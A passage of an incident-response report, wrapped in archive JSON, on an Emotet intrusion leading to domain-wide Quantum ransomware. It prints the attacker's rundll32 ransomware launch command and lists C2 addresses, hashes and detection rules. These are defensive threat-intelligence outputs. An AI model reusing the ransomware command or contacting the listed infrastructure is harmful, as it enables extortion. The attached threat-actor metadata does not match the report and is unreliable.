Email\n\nDuring the first two days, Emotet sent outbound spam emails over SMTP:\n\n\n-----\n\nThe following is an example of the SMTP traffic for sending the email, along with an\nextracted EML that was sent with an attached XLS:\n\n### Ransomware\n\nTowards the last day of the intrusion, the threat actor made their preparations to deploy\nransomware to the domain. They started by connecting to a new server via RDP from the\nserver they just used [Tactical RMM to deploy Anydesk. Once establishing the RDP](https://github.com/amidaware/tacticalrmm)\nconnection, they deployed Powertool64.exe, likely to prevent intervention by any security\n[tools and launched the software Don’t Sleep.](https://www.softwareok.com/?seite=Microsoft/DontSleep)\n\nDon’t Sleep has the capability to keep the computer from being shutdown and the user from\nbeing signed off. This was likely done to ensure nothing will interfere with the propagation of\nthe ransomware payload.\n\n\n-----\n\nFinally, with Don’t Sleep running, the threat actor executed a batch script named “1.bat“. The\nscript invoked the main ransomware payload, locker.dll, and passed a list of all the\ncomputers in the domain to the target parameter.\n\n\n-----\n\n```\nrundll32.exe locker.dll,run /TARGET=\\\\HOST1.DOMAIN.NAME\\C$\n/TARGET=\\\\HOST2.DOMAIN.NAME\\C$ /TARGET=\\\\HOST3.DOMAIN.NAME\\C$\n/login=DOMAIN\\Administrator /password=[REDACTED] /nolog /shareall\n\n```\nThe executable began to encrypt all the targeted hosts in the environment and dropped a\nransom note: README_TO_DECRYPT.html\n\n\n-----\n\nAfter the invocation of the ransomware payload, about a minute later, the threat actor\nlaunched Process Hacker. We believe this was to monitor the execution of the ransomware\npayload.\n\nAll systems in the domain were encrypted and presented with a ransom message.\n\n\n-----\n\n## Indicators\n\n### Atomic\n\n\n-----\n\n```\nEmotet Deployment Domains\n\ndescontador[.]com[.]br\n\nwww.elaboro[.]pl\n\nel-energiaki[.]gr\n\ndrechslerstammtisch[.]de\n\ndhnconstrucciones[.]com[.]ar\n\ndilsrl[.]com\n\nEmotet C2 Servers\n\n103.159.224.46\n\n103.75.201.2\n\n119.193.124.41\n\n128.199.225.17\n\n131.100.24.231\n\n139.59.60.88\n\n144.217.88.125\n\n146.59.226.45\n\n149.56.131.28\n\n159.89.202.34\n\n165.22.211.113\n\n165.227.166.238\n\n178.128.82.218\n\n209.126.98.206\n\n213.32.75.32\n\n37.187.115.122\n\n45.226.53.34\n\n45.55.134.126\n\n46.55.222.11\n\n51.210.176.76\n\n51.254.140.238\n\n54.37.70.105\n\n82.223.82.69\n\n91.207.181.106\n\n92.114.18.20\n\n94.23.45.86\n\n96.125.171.165\n\nCobalt Strike\n\n139.60.161.167 (survefuz[.]com)\n\n139.60.160.18 (juanjik[.]com)\n\nTactical RMM Agent\n\napi.floppasoftware[.]com\n\nmesh.floppasoftware[.]com\n\n212.73.150.62\n\n### Computed\n\n```\n\n-----\n\n```\nK 1 06.13.2022.lnk\n\nde7c4da78a6cbba096e32e5eecb00566\n\n02b4f495e9995cc2251c19cd9984763f52122951\n\n1bf9314ae67ab791932c43e6c64103b1b572a88035447dae781bffd21a1187ad\n\n17jun.exe\n\n0ea68856c4f56f4056502208e97e9033 \n\nb80c987c8849bf7905ea8f283b79d98753e3c15a \n\n41e230134deca492704401ddf556ee2198ef6f32b868ec626d9aefbf268ab6b1 \n\ndontsleep.exe\n\n50cc3a3bca96d7096c8118e838d9bc16 \n\nb286b58ed32b6df4ecdb5df86d7d7d177bb7bfaf \n\nf8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee \n\nlocker.dll\n\nd2df4601c8d43e655163c0b292bc4cc9 \n\nf6727d5d04f2728a3353fbd45d7b2cb19e98802c\n\n6424b4983f83f477a5da846a1dc3e2565b7a7d88ae3f084f3d3884c43aec5df6 \n\nnetscan.exe\n\n27f7186499bc8d10e51d17d3d6697bc5 \n\n52332ce16ee0c393b8eea6e71863ad41e3caeafd \n\n18f0898d595ec054d13b02915fb7d3636f65b8e53c0c66b3c7ee3b6fc37d3566 \n\nrclone.exe\n\n22bbe1747933531e9c240e0db86268e2 \n\nc2a8776e21403eb00b38bfccd36d1c03dffb009e\n\n53ae3567a34097f29011d752f1d3afab8f92beb36a8d6a5df5c1d4b12edc\n\n### Behavioral\nThe threat actor delivered Emotet via a Emotet loader in the form of a LNK file\nresponsible for dropping Emotet via Powershell (K-1 06.13.2022.lnk).\n\nTactical RMM Agent was installed by the threat actor on a server to ensure remote\naccess (17jun.exe).\n\nData was exfiltrated to Mega cloud service via Rclone (rclone.exe).\n\nNetwork mapping was performed using SoftPerfect Network Scanner (netscan.exe)\nfollowed by Quantum ransomware execution and propagation in the network (locker.dll).\n\nThe threat actor kept the remote desktop session alive by running a program to keep\nthe session active (dontsleep.exe)\n\n## Detections\n\n### Network\n\n```\n\n-----\n\n```\nET Threatview.io High Confidence Cobalt Strike C2 IP group 1\n\nET POLICY SMB2 NT Create AndX Request For an Executable File\n\nET POLICY SMB Executable File Transfer\n\nET RPC DCERPC SVCCTL - Remote Service Control Manager Access\n\nET INFO Observed External IP Lookup Domain (icanhazip .com in TLS SNI)t\n\nET JA3 HASH - Possible Rclone Client Response (Mega Storage)\n\nET POLICY HTTP POST to MEGA Userstorage\n\nET POLICY SMB Executable File Transfer\n\nET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement\nET POLICY SMB2 NT Create AndX Request For an Executable File\n\nET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software)\n\nET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection\n\nET USER_AGENTS AnyDesk Remote Desktop Software User-Agent\n\nET CNC Feodo Tracker Reported CnC Server group 1\n\nET CNC Feodo Tracker Reported CnC Server group 14\n\nET CNC Feodo Tracker Reported CnC Server group 15\n\nET CNC Feodo Tracker Reported CnC Server group 17\n\nET CNC Feodo Tracker Reported CnC Server group 19\n\nET CNC Feodo Tracker Reported CnC Server group 2\n\nET CNC Feodo Tracker Reported CnC Server group 20\n\nET CNC Feodo Tracker Reported CnC Server group 21\n\nET CNC Feodo Tracker Reported CnC Server group 23\n\nET CNC Feodo Tracker Reported CnC Server group 24\n\nET CNC Feodo Tracker Reported CnC Server group 25\n\nET CNC Feodo Tracker Reported CnC Server group 3\n\nET CNC Feodo Tracker Reported CnC Server group 4\n\nET CNC Feodo Tracker Reported CnC Server group 5\n\nET CNC Feodo Tracker Reported CnC Server group 6\n\nET CNC Feodo Tracker Reported CnC Server group 7\n\nET CNC Feodo Tracker Reported CnC Server group 8\n\nET CNC Feodo Tracker Reported CnC Server group 9\nET MALWARE W32/Emotet CnC Beacon 3\n\n### Sigma\n\n```\n**https://github.com/The-DFIR-Report/Sigma-**\n**Rules/blob/main/proc_creation_win_emotet_child_process_spawn_pattern.yml**\n\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_embed_exe_lnk.yml\nhttps://github.com/NVISOsecurity/sigmapublic/blob/master/rules/windows/process_creation/win_susp_recon_activity.yml\nhttps://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rul\nes/windows/process_creation/proc_creation_win_nltest_recon.yml\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creati\non_win_susp_rclone_execution.yml\nhttps://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rul\nes/windows/process_creation/proc_creation_win_susp_powershell_cmd_patterns.yml\n\n\n-----\n\nhttps://github.com/SigmaHQ/sigma/blob/a3eed2b760abddfd62014fcf9ae81f435b216473/rule\ns/windows/process_access/proc_access_win_lsass_memdump.yml\nhttps://github.com/SigmaHQ/sigma/blob/3a2079b02bcb1a2653ba9b5a5f56fd8b14a59820/rul\n[es/windows/builtin/system/win_system_possible_zerologon_exploitation_using_wellknown_t](https://github.com/SigmaHQ/sigma/blob/3a2079b02bcb1a2653ba9b5a5f56fd8b14a59820/rules/windows/builtin/system/win_system_possible_zerologon_exploitation_using_wellknown_tools.yml)\nools.yml\nhttps://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rul\nes/windows/process_creation/proc_creation_win_susp_wmic_execution.yml\nhttps://github.com/SigmaHQ/sigma/blob/8b749fb1260b92b9170e4e69fa1bd2f34e94d766/rul\nes/windows/builtin/system/win_system_anydesk_service_installation.yml\nhttps://github.com/SigmaHQ/sigma/blob/74e2d1bd3cec8fa72ba06cf4eef8e58fb5e0e237/rule\ns/windows/process_creation/proc_creation_win_susp_process_hacker.yml\nhttps://github.com/SigmaHQ/sigma/blob/08651822714c977d40d3c126c20ba4033d6836d3/ru\n[les/windows/registry/registry_set/registry_set_asep_reg_keys_modification_currentversion.y](https://github.com/SigmaHQ/sigma/blob/08651822714c977d40d3c126c20ba4033d6836d3/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_currentversion.yml)\nml\n\n### Yara\n\n[https://github.com/The-DFIR-Report/Yara-Rules/blob/main/15184/15184.yar](https://github.com/The-DFIR-Report/Yara-Rules/blob/main/15184/15184.yar)\n\n## MITRE\n\nPowerShell – T1059.001\n\nProcess Injection – T1055\n\nFile Deletion – T1070.004\n\nLateral Tool Transfer – T1570\n\nValid Accounts – T1078\n\nService Execution – T1569.002\n\nSMB/Windows Admin Shares – T1021.002\n\nRemote System Discovery – T1018\n\nProcess Discovery – T1057\n\nRundll32 – T1218.011\n\nRegsvr32 – T1218.010\n\nDomain Account – T1087.002\n\nDomain Groups – T1069.002\n\n\n-----\n\nSystem Information Discovery – T1082\n\nData Encrypted for Impact – T1486\n\nNetwork Share Discovery – T1135\n\nData from Network Shared Drive – T1039\n\nWeb Protocols – T1071.001\n\nRemote Access Software – T1219\n\nExfiltration to Cloud Storage – T1567.002\n\nRemote Desktop Protocol – T1021.001\n\nMalicious File – T1204.002\n\nSpearphishing Attachment – T1566.001\n\nExploitation of Remote Services – T1210\n\nInternal case #15184\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-11-28 - Emotet Strikes Again – LNK File Leads to Domain Wide Ransomware.pdf"
    ],
    "report_names": [
        "2022-11-28 - Emotet Strikes Again – LNK File Leads to Domain Wide Ransomware.pdf"
    ],
    "threat_actors": [
        {
            "id": "4b076dcb-516e-42fb-9c8f-f153902cd5e9",
            "created_at": "2022-10-25T16:07:23.708745Z",
            "updated_at": "2025-03-27T02:02:09.935617Z",
            "deleted_at": null,
            "main_name": "Hidden Lynx",
            "aliases": [
                "Aurora Panda",
                "Group 8",
                "Hidden Lynx",
                "Operation SMN"
            ],
            "source_name": "ETDA:Hidden Lynx",
            "tools": [
                "AGENT.ABQMR",
                "AGENT.AQUP.DROPPER",
                "AGENT.BMZA",
                "AGENT.GUNZ",
                "BlackCoffee",
                "HiKit",
                "MCRAT.A",
                "Mdmbot.E",
                "Moudoor",
                "Naid",
                "PNGRAT",
                "Trojan.Naid",
                "ZoxPNG",
                "gresim"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5cbf6c32-482d-4cd2-9d11-0d9311acdc28",
            "created_at": "2023-01-06T13:46:38.39927Z",
            "updated_at": "2025-03-27T02:00:02.823829Z",
            "deleted_at": null,
            "main_name": "ENERGETIC BEAR",
            "aliases": [
                "DYMALLOY",
                "TG-4192",
                "Crouching Yeti",
                "Group 24",
                "Havex",
                "IRON LIBERTY",
                "Blue Kraken",
                "ALLANITE",
                "Koala Team",
                "G0035",
                "ATK6",
                "ITG15",
                "Ghost Blizzard",
                "BERSERK BEAR"
            ],
            "source_name": "MISPGALAXY:ENERGETIC BEAR",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "761d1fb2-60e3-46f0-9f1c-c8a9715967d4",
            "created_at": "2023-01-06T13:46:38.269054Z",
            "updated_at": "2025-03-27T02:00:02.789278Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "TG-0110",
                "Group 6",
                "Buckeye",
                "Boyusec",
                "BORON",
                "BRONZE MAYFAIR",
                "Red Sylvan",
                "GOTHIC PANDA"
            ],
            "source_name": "MISPGALAXY:APT3",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a7aefdda-98f1-4790-a32d-14cc99de2d60",
            "created_at": "2023-01-06T13:46:38.281844Z",
            "updated_at": "2025-03-27T02:00:02.792526Z",
            "deleted_at": null,
            "main_name": "APT17",
            "aliases": [
                "G0025",
                "AURORA PANDA",
                "Group 72",
                "G0001",
                "HELIUM",
                "Group 8",
                "Hidden Lynx",
                "Tailgater Team",
                "BRONZE KEYSTONE"
            ],
            "source_name": "MISPGALAXY:APT17",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "06f622cb-3a78-49cf-9a4c-a6007a69325f",
            "created_at": "2022-10-25T16:07:23.315239Z",
            "updated_at": "2025-03-27T02:02:09.733197Z",
            "deleted_at": null,
            "main_name": "APT 3",
            "aliases": [
                "APT 3",
                "Bronze Mayfair",
                "Buckeye",
                "Gothic Panda",
                "Group 6",
                "Operation Clandestine Fox",
                "Operation Clandestine Fox, Part Deux",
                "Operation Clandestine Wolf",
                "Operation Double Tap",
                "Red Sylvan",
                "TG-0110",
                "UPS Team"
            ],
            "source_name": "ETDA:APT 3",
            "tools": [
                "APT3 Keylogger",
                "Agent.dhwf",
                "BKDR_HUPIGON",
                "Backdoor.APT.CookieCutter",
                "Badey",
                "Bemstour",
                "CookieCutter",
                "Destroy RAT",
                "DestroyRAT",
                "DoublePulsar",
                "EXL",
                "EternalBlue",
                "HTran",
                "HUC Packet Transmit Tool",
                "Hupigon",
                "Hupigon RAT",
                "Kaba",
                "Korplug",
                "LaZagne",
                "MFC Huner",
                "OSInfo",
                "Pirpi",
                "PlugX",
                "RedDelta",
                "RemoteCMD",
                "SHOTPUT",
                "Sogu",
                "TIGERPLUG",
                "TTCalc",
                "TVT",
                "Thoper",
                "Xamtrav",
                "remotecmd",
                "shareip",
                "w32times"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3aaf0755-5c9b-4612-9f0e-e266ef1bdb4b",
            "created_at": "2022-10-25T16:07:23.480196Z",
            "updated_at": "2025-03-27T02:02:09.826059Z",
            "deleted_at": null,
            "main_name": "Comment Crew",
            "aliases": [
                "APT 1",
                "BrownFox",
                "Byzantine Candor",
                "Byzantine Hades",
                "Comment Crew",
                "Comment Panda",
                "GIF89a",
                "Group 3",
                "Operation Oceansalt",
                "Operation Seasalt",
                "Operation Siesta",
                "Shanghai Group",
                "TG-8223"
            ],
            "source_name": "ETDA:Comment Crew",
            "tools": [
                "Auriga",
                "Cachedump",
                "Chymine",
                "CookieBag",
                "Darkmoon",
                "GDOCUPLOAD",
                "GLOOXMAIL",
                "GREENCAT",
                "Gen:Trojan.Heur.PT",
                "GetMail",
                "Hackfase",
                "Hacksfase",
                "Helauto",
                "Kurton",
                "LETSGO",
                "LIGHTBOLT",
                "LIGHTDART",
                "LOLBAS",
                "LOLBins",
                "LONGRUN",
                "Living off the Land",
                "Lslsass",
                "MAPIget",
                "ManItsMe",
                "Mimikatz",
                "MiniASP",
                "Oceansalt",
                "Pass-The-Hash Toolkit",
                "Poison Ivy",
                "ProcDump",
                "Riodrv",
                "SPIVY",
                "Seasalt",
                "ShadyRAT",
                "StarsyPound",
                "TROJAN.COOKIES",
                "TROJAN.FOXY",
                "TabMsgSQL",
                "Tarsip",
                "Trojan.GTALK",
                "WebC2",
                "WebC2-AdSpace",
                "WebC2-Ausov",
                "WebC2-Bolid",
                "WebC2-Cson",
                "WebC2-DIV",
                "WebC2-GreenCat",
                "WebC2-Head",
                "WebC2-Kt3",
                "WebC2-Qbp",
                "WebC2-Rave",
                "WebC2-Table",
                "WebC2-UGX",
                "WebC2-Yahoo",
                "Wordpress Bruteforcer",
                "bangat",
                "gsecdump",
                "pivy",
                "poisonivy",
                "pwdump",
                "zxdosml"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535834,
    "ts_updated_at": 1743041813,
    "ts_creation_date": 1672273035,
    "ts_modification_date": 1672273035,
    "files": {
        "pdf": "https://archive.orkl.eu/f8c4fb5baa3c2aa3f886fc3787f1dd71c36cd1dc.pdf",
        "text": "https://archive.orkl.eu/f8c4fb5baa3c2aa3f886fc3787f1dd71c36cd1dc.txt",
        "img": "https://archive.orkl.eu/f8c4fb5baa3c2aa3f886fc3787f1dd71c36cd1dc.jpg"
    }
}